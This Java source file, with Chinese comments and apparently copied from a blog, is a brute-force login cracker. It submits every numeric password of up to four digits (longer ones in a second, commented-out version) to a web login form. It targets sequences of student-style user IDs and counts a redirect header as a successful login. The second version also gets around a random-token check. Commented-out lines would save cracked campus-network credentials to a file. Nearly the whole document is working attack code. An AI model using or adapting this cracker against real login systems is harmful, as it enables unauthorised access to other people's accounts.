package net;

import java.io.IOException;  
import java.io.PrintWriter;  
import java.net.HttpURLConnection;  
import java.net.URL;  
  
//import mine.util.io.TextFile;  
  
//暴力法破解简单登录系统：该系统无任何安全措施  
public class Main { 
    String urlString = "登录页面的url";  
  
    public Main() {  
    }  
  
    public Main(String urlString) {  
        this.urlString = urlString;  
    }  
  
    // 提交一次用户请求  
    private boolean doPost(String user, String password) {  
        boolean sucess = false;  
        try {  
            URL realUrl = new URL(urlString);  
            HttpURLConnection conn = (HttpURLConnection) realUrl  
                    .openConnection();  
            conn.setDoOutput(true);  
            conn.setDoInput(true);  
            conn.setInstanceFollowRedirects(false);  
  
            // 提交表单,发送的数据是直接用Firebug截取的然后把用户名，密码部分换成参数  
            PrintWriter out = new PrintWriter(conn.getOutputStream());  
            out.print("要提交的表单信息");  
            out.flush();  
  
            // 如果登录不成功，报头中没有Location字段，getHeaderField("Location") 返回null  
            // 登录成功，返回一个随机的Location字段  
            // System.out.println(conn.getHeaderFields());  
            if (conn.getHeaderField("Location") != null) {  
                sucess = true;  
            }  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return sucess;  
    }  
  
    // 这是一个全排列算法, 对特定长度的密码排列组合，把结果存入list  
    // user:用户名 ， n:字符下标 ， len：字符数组长度,也就是密码长度  
    private boolean createPassWord(String user, char[] str, int n, int len) {  
        if (n == len) {  
            String ps = new String(str);  
            if (doPost(user, ps)) {  
              System.out.println("sucess:" + user + " : " + ps);  
//                TextFile.write("file/校园网用户名及密码.txt", true, "sucess:" + user  
//                        + " : " + ps + "\n");
//                FileOutputStream out=new FileOutputStream("d://校园网用户名及密码.txt");
//                BufferedWriter buf=new BufferedWriter(out);
//                return true;  
            }  
            return false;  
        }  
        for (int i = 0; i <= 9; i++) {  
            str[n] = (char) (i + '0');  
            if (createPassWord(user, str, n + 1, len))  
                return true;  
        }  
        return false;  
    }  
  
    // 破解一个用户的密码  
    public void test(String user) {  
        for (int i = 0; i < 4; i++) {  
            if (createPassWord(user, new char[i + 1], 0, i + 1))  
                break;  
        }  
    }  
  
    public static void main(String[] args) {  
        Main pt = new Main();  
        for (int i = 1; i <= 9; i++)  
            pt.test("1" + i);  
        for (int i = 10; i <= 31; i++)  
            pt.test("0905051" + i);  
    }  
}  
/*
</span>  


 
这个示例代码中只破解密码为4位或4位数字之内的密码，大概破解一个用户需要十分钟。如果破解5、6...更长的密码，破解时间将很长。
注：以下破解思路及代码源自我同学木子
2、在有些登录系统会采用安全措施，每次登录都会在url上产生一个随机值，该值为报头信息中的Location字段的值，所以破解时要先获得该值，然后组成真正的url给服务器发送表单信息，这里要进行两次连接，第一次获取Location字段的值，第二次才是真正的模拟登录。注意要御制重定向。代码如下：
[java] view plaincopy 
<span style="font-size:16px;">package demo.net;  
  
import java.io.IOException;  
import java.io.PrintWriter;  
import java.net.HttpURLConnection;  
import java.net.URL;  
  
//暴力法破解登录系统：该登录系统的特征是报头信息中有Location字段，该字段的值随机生成  
public class HttpTest {  
    //要破解的登录系统的url  
    String urlString = "要破解的系统的url";  
  
    public HttpTest() {  
    }  
  
    public HttpTest(String urlString) {  
        this.urlString = urlString;  
    }  
  
    // 提交一次用户请求  
    private boolean doPost(String user, String password) {  
        boolean sucess = false;  
        try {  
            // 先通过url获取head中Location字段，这个字段是随机的，每次连接都不一样  
            URL url = new URL(urlString);  
            HttpURLConnection connection = (HttpURLConnection) url  
                    .openConnection();  
            connection.setRequestMethod("HEAD");  
            connection.setInstanceFollowRedirects(false);// 不让重定向，这样才会返回Location字段信息  
            connection.connect();  
  
            // 通过获取的Location字段的信息构造真正提交表单的url  
            URL realUrl = new URL(urlString  
                    + connection.getHeaderField("Location"));  
            HttpURLConnection conn = (HttpURLConnection) realUrl  
                    .openConnection();  
            conn.setDoOutput(true);  
            conn.setDoInput(true);  
            conn.setInstanceFollowRedirects(false);  
  
            // 提交表单,发送的数据是直接用Firebug截取的然后把用户名，密码部分换成参数  
            PrintWriter out = new PrintWriter(conn.getOutputStream());  
            out.print("登录时提交的表单信息");  
            out.flush();  
  
            // 如果登录不成功，报头中没有Location字段，getHeaderField("Location") 返回null  
            // 登录成功，返回一个随机的Location字段  
            // System.out.println(conn.getHeaderFields());  
            if (conn.getHeaderField("Location") != null) {  
                sucess = true;  
            }  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return sucess;  
    }  
  
    // 这是一个全排列算法, 对特定长度的密码排列组合，把结果存入list  
    // user:用户名 ， n:字符下标 ， len：字符数组长度,也就是密码长度  
    private boolean createPassWord(String user, char[] str, int n, int len) {  
        if (n == len) {  
            String ps = new String(str);  
            if (doPost(user, ps)) {  
                System.out.println("sucess:" + user + " : " + ps);  
                return true;  
            }  
            return false;  
        }  
        for (int i = 0; i <= 9; i++) {  
            str[n] = (char) (i + '0');  
            if (createPassWord(user, str, n + 1, len))  
                return true;  
        }  
        return false;  
    }  
  
    // 破解一个用户的密码  
    public void test(String user) {  
        for (int i = 5; i < 20; i++) {  
            if (createPassWord(user, new char[i + 1], 0, i + 1))  
                break;  
        }  
    }  
  
    public static void main(String[] args) {  
        HttpTest pt = new HttpTest();  
        pt.test("090505105");  
    }  
}
*/

